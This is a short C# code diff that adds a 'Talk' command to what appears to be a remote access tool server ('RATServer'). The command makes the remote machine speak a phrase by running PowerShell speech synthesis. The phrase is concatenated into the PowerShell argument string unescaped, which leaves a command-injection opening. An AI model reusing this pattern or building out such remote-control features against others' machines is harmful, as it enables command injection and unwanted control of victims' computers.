@@ -298,5 +298,22 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
+        public static Response Talk(string Phrase)
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process p = new Process();
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.FileName = "powershell.exe";
+                p.StartInfo.Arguments = $"-Command \"Add-Type -AssemblyName System.Speech;$speechSynthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speechSynthesizer.Speak('" + Phrase + "')";
+                p.Start();              
+                p.WaitForExit();
+                r.Msg = "Talk Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
     }
 }
